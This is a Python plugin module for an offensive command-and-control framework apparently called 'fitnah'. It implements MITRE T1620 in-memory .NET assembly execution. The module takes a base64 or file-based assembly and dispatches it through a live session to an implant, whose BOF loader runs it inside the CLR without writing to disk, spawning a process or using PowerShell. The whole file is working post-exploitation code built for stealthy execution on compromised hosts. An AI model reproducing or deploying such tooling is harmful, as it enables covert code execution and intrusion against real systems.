"""execution/execute_assembly — in-memory .NET assembly execution via execute-assembly BOF. MITRE T1620

Dispatches to implant's execute-assembly capability: the BOF hosts the CLR
in-process and calls Assembly.Load() + EntryPoint.Invoke() without touching disk.
No PowerShell, no Add-Type, no new process.
"""
import base64
from pathlib import Path
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class ExecuteAssembly(BasePlugin):
    NAME        = "execute_assembly"
    DESCRIPTION = "Load and run .NET assembly entirely in-memory via CLR BOF. No PowerShell, no disk."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1620"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("assembly_b64",  str, required=False, default="",
              help="Base64-encoded .NET assembly bytes"),
        Param("assembly_path", str, required=False, default="",
              help="Local path to .NET assembly file (operator-side)"),
        Param("args",          str, required=False, default="",
              help="Command-line arguments passed to assembly EntryPoint"),
    )

    @mitre("T1620")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        asm_b64  = params.get("assembly_b64", "").strip()
        asm_path = params.get("assembly_path", "").strip()
        asm_args = params.get("args", "").strip()

        if not asm_b64 and not asm_path:
            return ModuleResult.err("Provide assembly_b64 or assembly_path")
        if asm_path and not asm_b64:
            p = Path(asm_path)
            if not p.exists():
                return ModuleResult.err(f"Assembly not found: {asm_path}")
            asm_b64 = base64.b64encode(p.read_bytes()).decode()

        # Dispatch as "execute_assembly" command — implant's BOF loader hosts CLR in-process
        r = ctx.send("execute_assembly", {"assembly_b64": asm_b64, "args": asm_args})
        if r["status"] != "ok":
            return ModuleResult.err(f"execute_assembly failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
